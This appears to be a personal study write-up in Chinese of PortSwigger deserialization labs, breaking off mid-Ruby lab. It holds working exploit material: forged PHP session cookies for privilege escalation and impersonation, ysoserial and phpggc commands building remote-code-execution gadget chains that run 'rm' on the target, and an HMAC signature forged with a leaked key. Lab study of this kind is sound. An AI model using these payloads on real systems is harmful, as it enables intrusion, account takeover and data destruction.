---
title: Insecure deserialization
description: Insecure deserialization
# last_update:
#   date: "2025-10-07T08:00:00+08:00"
last_update:
  date: "2025-11-09T08:00:00+08:00"
---

## PHP serialization format

https://portswigger.net/web-security/deserialization/exploiting#php-serialization-format

## Java serialization format

https://portswigger.net/web-security/deserialization/exploiting#java-serialization-format

## Lab: Modifying serialized objects

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#modifying-object-attributes                      |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects |

登入後，看到 Cookie `session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=` (URL Decoded 版本)

```js
atob(
  "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=",
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

嘗試構造

```js
btoa(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

塞回 Cookie.session，重整網頁，即可看到 Admin Panel～

## Lab: Modifying serialized data types

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#modifying-data-types                                |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types |

PHP 的 `==` 有一些特殊的情境

```php
5 == "5" // true
5 == "5 of something" // true

// in PHP 7.x and earlier
0 == "Example string" // true
```

登入後，看 Cookie.session

```js
atob(
  `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2NzlnMXNrcHN0bWx2dm4xbDZ0NjI3ZWxqZXNxZHBtaCI7fQ==`,
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"v79g1skpstmlvvn1l6t627eljesqdpmh";}
```

參考 [function.serialize.php](https://www.php.net/manual/en/function.serialize.php) 修改成

```js
btoa(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==
```

成功解題～

## Lab: Using application functionality to exploit insecure deserialization

| Dimension | Description                                                                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#using-application-functionality                                                         |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization |

嘗試

```js
atob(
  `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkenh6MHB2eTd1ZDhqZnZneDAwczI1MjdtZHBxY2htaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=`,
);
// O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dzxz0pvy7ud8jfvgx00s2527mdpqchmh";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

改成

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dzxz0pvy7ud8jfvgx00s2527mdpqchmh";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkenh6MHB2eTd1ZDhqZnZneDAwczI1MjdtZHBxY2htaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

然後刪除帳號，可惜沒成功，還好還有另一組帳密可以用，登入後嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:19:"users/carlos/avatar";}'`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30n
```

看到

```
PHP Fatal error: Uncaught Exception: (DEBUG: $access_tokens[$user->username] = e82ar2z914858ch6cqdugqpycrouj8qz, $user->access_token = 0, $access_tokens = [e82ar2z914858ch6cqdugqpycrouj8qz, gi9luj09fotgyfceggc3sfezlydykp0k, dzxz0pvy7ud8jfvgx00s2527mdpqchmh]) Invalid access token for user carlos in /var/www/index.php:8 Stack trace: #0 {main} thrown in /var/www/index.php on line 8
```

看一下目前登入的使用者

```js
atob(
  `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImdpOWx1ajA5Zm90Z3lmY2VnZ2Mzc2Zlemx5ZHlrcDBrIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9`,
);
// O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"gi9luj09fotgyfceggc3sfezlydykp0k";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

推測 `e82ar2z914858ch6cqdugqpycrouj8qz` 應該是 carlos 的 access_token，嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"e82ar2z914858ch6cqdugqpycrouj8qz";s:11:"avatar_link";s:19:"users/carlos/avatar";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlODJhcjJ6OTE0ODU4Y2g2Y3FkdWdxcHljcm91ajhxeiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30=
```

重整後，被導回登入頁，但至少沒有噴錯了，再嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"e82ar2z914858ch6cqdugqpycrouj8qz";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlODJhcjJ6OTE0ODU4Y2g2Y3FkdWdxcHljcm91ajhxeiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
fetch(`${location.origin}/my-account/delete`, { method: "POST" });
```

看到錯誤

```html
Internal Server Error PHP Warning: file_put_contents(users/carlos/disabled):
failed to open stream: No such file or directory in /home/carlos/User.php on
line 45 PHP Fatal error: Uncaught Exception: Could not write to
users/carlos/disabled in /home/carlos/User.php:46 Stack trace: #0 Command line
code(5): User->delete() #1 {main} thrown in /home/carlos/User.php on line 46
```

剛才被導回登入頁，其實是因為我網址沒換，改成 `/my-account?id=carlos` 就可以成功看到 carlos 的帳號

用 carlos 的帳號上傳照片後，再刪除帳號，還是沒辦法解題，感覺就差臨門一腳了，忍住不要看答案～但既然 carlos 的帳號被我刪掉，應該就只能重啟 Lab 了QQ

- 從錯誤訊息 `No such file or directory in /home/carlos/User.php`
- Lab 的 Description `delete the morale.txt file from Carlos's home directory`
- 推測應該要改為 `/home/carlos/morale.txt`

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"payia0hddvlpxag6yunxxwfzm1c48cgl";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwYXlpYTBoZGR2bHB4YWc2eXVueHh3ZnptMWM0OGNnbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

成功解題～

## Magic methods

https://portswigger.net/web-security/deserialization/exploiting#magic-methods

invoked whenever an object of the class is instantiated

- PHP => `__construct()`
- Python => `__init__`

invoked automatically during the deserialization process

- PHP => `__wakeup()`
- Java => `ObjectInputStream.readObject()`

## Lab: Arbitrary object injection in PHP

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#injecting-arbitrary-objects                           |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php |

登入後，立馬在 HTML 看到 `<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->`，訪問 /libs/CustomTemplate.php~ 就可以看到原始碼

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```

查看目前的 Cookie.session

```js
atob(
  `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjbTlram5rZjVxemtyMmZuYXpiZ2R5cGR1NTBtMjg3NiI7fQ==`,
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cm9kjnkf5qzkr2fnazbgdypdu50m2876";}
```

用跟上一題一樣的方式，先登入 carlos 的帳號

```js
btoa(
  `O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"cm9kjnkf5qzkr2fnazbgdypdu50m2876";}`,
);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjbTlram5rZjVxemtyMmZuYXpiZ2R5cGR1NTBtMjg3NiI7fQ==
```

這題利用的是 unserialize 的時候不會執行 `__construct`，並且 `__destruct` 看起來就是物件被銷毀的時候會自動執行，所以設定 `lock_file_path: /home/carlos/morale.txt` 就可以成功刪除檔案～

```js
btoa(
  `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`,
);
// TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

## Lab: Exploiting Java deserialization with Apache Commons

| Dimension | Description                                                                                                                             |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#working-with-pre-built-gadget-chains                                    |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons |

```js
atob(
  `rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB2ZHhuNDhwYzVqcWxkdm90eDM5NnAyODdyZnZwZ2dmY3QABndpZW5lcg==`,
);
// ¬í\x00\x05sr\x00/lab.actions.common.serializable.AccessTokenUser\x19Qüå\x12'©\x81\x02\x00\x02L\x00\vaccessTokent\x00\x12Ljava/lang/String;L\x00\busernameq\x00~\x00\x01xpt\x00 vdxn48pc5jqldvotx396p287rfvpggfct\x00\x06wiener
```

- 裝 Java x64 MSI Installer https://download.oracle.com/java/25/latest/jdk-25_windows-x64_bin.msi
- 裝 Maven Binary zip archive https://dlcdn.apache.org/maven/maven-3/3.9.11/binaries/apache-maven-3.9.11-bin.zip
- 裝 ysoserial https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

嘗試在終端機

```
cmd
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 "rm /home/carlos/morale.txt" > payload.bin

powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin"))
```

之後在瀏覽器

```js
encodeURIComponent(
  `rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABpybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4`,
);
```

重整後看到

```
java.lang.ClassNotFoundException: org.apache.commons.collections.keyvalue.TiedMapEntry
```

改成用 CommonsCollections2，但因為瀏覽器針對 Cookie 有大小限制，所以改成 Burp Suite Repeater，成功解題（但好沒成就感，感覺像是 script kiddle）

## Lab: Exploiting PHP deserialization with a pre-built gadget chain

| Dimension | Description                                                                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#working-with-pre-built-gadget-chains                                             |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain |

登入之後，看到 Cookie.session

```json
{
  "token": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlaTdkdDByNXJmMnMwdm9lbWJtNXVtNmE4dGt1MXQ2dSI7fQ==",
  "sig_hmac_sha1": "fbfe3e16e1ed8b3b73f20a34d34cbc216fc17b91"
}
```

token base64 decode 之後

```js
atob(
  `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlaTdkdDByNXJmMnMwdm9lbWJtNXVtNmE4dGt1MXQ2dSI7fQ==`,
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ei7dt0r5rf2s0voembm5um6a8tku1t6u";}
```

嘗試將 username 改成 carlos

```js
btoa(
  `O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"ei7dt0r5rf2s0voembm5um6a8tku1t6u";}`,
);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlaTdkdDByNXJmMnMwdm9lbWJtNXVtNmE4dGt1MXQ2dSI7fQ==
encodeURIComponent(
  `{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlaTdkdDByNXJmMnMwdm9lbWJtNXVtNmE4dGt1MXQ2dSI7fQ==","sig_hmac_sha1":"fbfe3e16e1ed8b3b73f20a34d34cbc216fc17b91"}`,
);
// %7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlaTdkdDByNXJmMnMwdm9lbWJtNXVtNmE4dGt1MXQ2dSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22fbfe3e16e1ed8b3b73f20a34d34cbc216fc17b91%22%7D
```

進入 `/my-account` 後，看到

```
Internal Server Error: Symfony Version: 4.3.6
PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php on line 7
```

前面有說到可以用 [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)，在終端機執行

```
git clone https://github.com/ambionics/phpggc.git
cmd
C:\Users\samue\Desktop\daily\xampp\php\php.exe phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" -b
// output
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319
```

然後瀏覽器執行

```js
encodeURIComponent(
  `{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319","sig_hmac_sha1":"8fa15cd327cdd8a1e0b1e27d751041adcaa81694"}`,
);
// %7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%228fa15cd327cdd8a1e0b1e27d751041adcaa81694%22%7D
```

重整網頁後，還是看到

```
Internal Server Error: Symfony Version: 4.3.6
PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php on line 7
```

看來是要想辦法知道 [HmacSHA1 Hash](https://tools.onecompiler.com/hmac-sha1) 的 Key

這題也有留註解 `<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`，訪問 `/cgi-bin/phpinfo.php` ，直接搜尋 key，看到 `SECRET_KEY: t5pzxaqlqctedvnx90d847bu0rby1dxu`

使用 [HmacSHA1 Hash Generator](https://tools.onecompiler.com/hmac-sha1) 構造 `sig_hmac_sha1` 欄位的值，並且在瀏覽器構造

```js
encodeURIComponent(
  `{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319","sig_hmac_sha1":"68e7269aac4c53f61be6a4370dabbfef0f64edcd"}`,
);
// %7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%2268e7269aac4c53f61be6a4370dabbfef0f64edcd%22%7D
```

成功解題～

## Lab: Exploiting Ruby deserialization using a documented gadget chain

| Dimension | Description                                                                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#working-with-documented-gadget-chains                                               |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain |

登入後先看 Cookie.session

```js
atob(
  `BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiV6YmxrcXdjNnZiY2xwNmltZ21qNGxpanZwY3N5OHpvMgY7B0YK`,
);
// \x04\bo:\tUser\x07:\x0E@usernameI"\vwiener\x06:\x06EF:\x12@access_tokenI"%zblkqwc6vbclp6imgmj4lijvpcsy8zo2\x06;\x07F\n
```

一開始嘗試 [Ruby2.x-RCE-Deserialization](https://github.com/j4k0m/Ruby2.x-RCE-Deserialization/blob/main/generator.rb)，但 Lab 噴了

```
